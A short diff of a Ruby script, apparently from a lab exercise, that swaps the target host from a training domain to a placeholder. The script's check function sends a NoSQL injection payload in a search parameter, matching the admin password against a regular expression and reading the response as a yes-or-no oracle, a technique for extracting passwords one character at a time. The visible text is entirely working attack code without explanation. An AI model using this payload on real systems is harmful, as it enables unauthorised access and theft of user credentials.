@@ -1,6 +1,6 @@
 require 'httparty'
 
-URL="ptc-3dc24475-29260948.libcurl.so"
+URL="google.com"
 def check?(str)
 	resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
 	return resp.body =~ />admin</
